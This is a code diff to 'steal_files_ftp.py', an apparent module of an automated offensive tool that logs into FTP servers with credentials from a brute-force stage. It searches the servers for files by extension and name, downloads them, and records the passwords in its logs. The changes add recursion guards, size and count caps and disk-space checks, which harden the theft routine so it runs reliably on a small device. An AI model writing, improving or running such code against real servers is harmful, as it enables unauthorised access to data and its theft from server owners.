@@ -3,6 +3,7 @@ steal_files_ftp.py - This script connects to FTP servers using provided credenti
 """
 
 import os
+import shutil
 import logging
 import time
 from rich.console import Console
@@ -20,6 +21,13 @@ b_module = "steal_files_ftp"
 b_status = "steal_files_ftp"
 b_parent = "FTPBruteforce"
 b_port = 21
+
+# Hard caps so a hostile/looped tree cannot hang or fill a 512 MB Pi Zero.
+MAX_DEPTH = 6
+MAX_FILES_PER_RUN = 100
+MAX_FILE_BYTES = 50 * 1024 * 1024
+MAX_RUN_BYTES = 200 * 1024 * 1024
+MIN_FREE_BYTES = 100 * 1024 * 1024
 
 class StealFilesFTP:
     """
@@ -49,23 +57,48 @@ class StealFilesFTP:
             logger.error(f"FTP connection error for {ip} with user '{username}' and password '{password}': {e}")
             return None
 
-    def find_files(self, ftp, dir_path):
+    def find_files(self, ftp, dir_path, depth=0, visited=None):
         """
-        Find files in the FTP share based on the configuration criteria.
+        Find files in the FTP tree based on the configuration criteria.
+
+        depth + visited guards stop cyclic directory structures from recursing
+        forever and wedging the worker.
         """
+        if visited is None:
+            visited = set()
         files = []
+        if depth > MAX_DEPTH:
+            return files
+        key = dir_path.rstrip('/') or '/'
+        if key in visited:
+            logger.warning(f"FTP cycle detected at {dir_path}; stopping recurse")
+            return files
+        visited.add(key)
         try:
             ftp.cwd(dir_path)
             items = ftp.nlst()
             for item in items:
+                if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
+                    break
+                if len(files) >= MAX_FILES_PER_RUN:
+                    logger.warning(f"FTP file cap ({MAX_FILES_PER_RUN}) reached under {dir_path}")
+                    break
+                # Skip . and .. explicitly
+                base = os.path.basename(item.rstrip('/'))
+                if base in ('.', '..'):
+                    continue
                 try:
                     ftp.cwd(item)
-                    files.extend(self.find_files(ftp, os.path.join(dir_path, item)))
-                    ftp.cwd('..')
+                    ftp.cwd('..')  # it was a directory — recurse
+                    files.extend(self.find_files(
+                        ftp, os.path.join(dir_path, base),
+                        depth=depth + 1, visited=visited,
+                    ))
+                    ftp.cwd(dir_path)  # restore after recurse
                 except Exception:
                     if any(item.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                        any(file_name in item for file_name in self.shared_data.steal_file_names):
-                        files.append(os.path.join(dir_path, item))
+                        files.append(os.path.join(dir_path, item) if not item.startswith('/') else item)
             logger.info(f"Found {len(files)} matching files in {dir_path} on FTP")
         except Exception as e:
             logger.error(f"Error accessing path {dir_path} on FTP: {e}")
@@ -74,16 +107,47 @@ class StealFilesFTP:
     def steal_file(self, ftp, remote_file, local_dir):
         """
         Download a file from the FTP server to the local directory.
+
+        Enforces per-file / per-run byte budgets and a free-space precheck.
         """
         try:
+            try:
+                free = shutil.disk_usage(local_dir if os.path.isdir(local_dir) else os.path.dirname(local_dir) or '/').free
+            except Exception:
+                free = shutil.disk_usage('/').free
+            if free < MIN_FREE_BYTES:
+                logger.error(f"Refusing FTP steal: only {free} bytes free (need {MIN_FREE_BYTES})")
+                self.stop_execution = True
+                return
+            if getattr(self, '_run_bytes', 0) >= MAX_RUN_BYTES:
+                logger.warning(f"FTP per-run byte budget ({MAX_RUN_BYTES}) exhausted; stopping")
+                self.stop_execution = True
+                return
+
             local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
             local_file_dir = os.path.dirname(local_file_path)
             os.makedirs(local_file_dir, exist_ok=True)
+
+            written = [0]
+            def _cb(chunk):
+                written[0] += len(chunk)
+                if written[0] > MAX_FILE_BYTES:
+                    raise IOError(f"file exceeds MAX_FILE_BYTES ({MAX_FILE_BYTES})")
+                if getattr(self, '_run_bytes', 0) + written[0] > MAX_RUN_BYTES:
+                    raise IOError(f"run would exceed MAX_RUN_BYTES ({MAX_RUN_BYTES})")
+                f.write(chunk)
+
             with open(local_file_path, 'wb') as f:
-                ftp.retrbinary(f'RETR {remote_file}', f.write)
-            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
+                ftp.retrbinary(f'RETR {remote_file}', _cb)
+            self._run_bytes = getattr(self, '_run_bytes', 0) + written[0]
+            logger.success(f"Downloaded file from {remote_file} to {local_file_path} ({written[0]} bytes)")
         except Exception as e:
             logger.error(f"Error downloading file {remote_file} from FTP: {e}")
+            try:
+                if 'local_file_path' in locals() and os.path.exists(local_file_path):
+                    os.unlink(local_file_path)
+            except OSError:
+                pass
 
     def execute(self, ip, port, row, status_key):
         """
@@ -100,6 +164,7 @@ class StealFilesFTP:
                 # success left *_connected True and disarmed the timeout for good.
                 self.stop_execution = False
                 self.ftp_connected = False
+                self._run_bytes = 0
                 logger.info(f"Stealing files from {ip}:{port}...")
                 settle_for_display(self.shared_data)  # let the panel show this action's name
 
